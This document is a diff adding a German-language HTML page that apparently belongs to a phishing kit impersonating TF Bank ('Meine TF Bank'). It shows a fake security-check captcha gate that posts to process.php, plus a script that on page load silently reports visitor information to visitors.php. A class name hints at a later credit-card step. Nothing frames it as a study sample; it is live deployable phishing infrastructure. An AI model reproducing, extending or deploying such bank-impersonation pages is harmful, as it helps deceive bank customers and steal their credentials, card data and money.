@@ -1,0 +1,73 @@
+source: <!DOCTYPE html>
+<html lang="de">
+
+<head>
+  <meta charset="utf-8">
+  <title>Meine TF Bank</title>
+  <meta name="description" content="This is a Business Website">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="assets/images/icon.png">
+  <!-- CSS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/css/style.css">
+  <link rel="stylesheet" href="assets/css/responsive.css">
+</head>
+
+<body style="background: url(assets/images/bg.webp) no-repeat center center / cover;">
+
+<div class="login-container" style="max-width:410px;">
+    <img src="assets/images/logo.png" class="logo">
+    <div class="captcha-content">
+    <h2>Sicherheitsüberprüfung</h2>
+    <p style="font-size: 17px; line-height: 1.6;">Bitte bestätigen Sie, dass Sie kein automatisierter Zugriff sind. Klicken Sie auf '<span>Ich bin kein Roboter</span>', um die Sicherheitsprüfung abzuschließen, und anschließend auf '<span>Weiter</span>', um fortzufahren.</p>
+      <form method="post" action="process.php" onsubmit="return validateCaptcha()">
+        <div class="g-recaptcha" data-sitekey="6LfYy4krAAAAANtUGUMdVtRE2bUAFQtkI7S409HA" data-size="normal"></div>
+        <div class="credit-card-failed" id="captcha-error-box" style="display: none;">
+          <div class="login-error center">
+            <i class="fas fa-exclamation-triangle"></i>
+            <p>Bitte bestätigen Sie, dass Sie kein Roboter sind.</p>
+          </div>
+        </div>
+        <button type="submit" class="login-btn">Weiter</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- JavaScript -->
+  <script src="assets/js/jquery-3.7.1.min.js"></script>
+  <script src="assets/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/js/script.js"></script>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <script>
+    function validateCaptcha() {
+      var response = grecaptcha.getResponse();
+      var errorBox = document.getElementById('captcha-error-box');
+
+      if (!response || response.length === 0) {
+        errorBox.style.display = "flex";
+        return false;
+      } else {
+        errorBox.style.display = "none";
+        return true;
+      }
+    }
+  </script>
+  <script>
+        $(document).ready(function () {
+        $.ajax({
+            type: 'GET',
+            url: 'visitors.php',
+            success: function () {
+                console.log('Visitor information sent to visitors.php');
+            },
+            error: function () {
+                console.error('Failed to send visitor information');
+            }
+        });
+    });
+  </script>
+</body>
+
+</html>
+Page title: Meine TF Bank
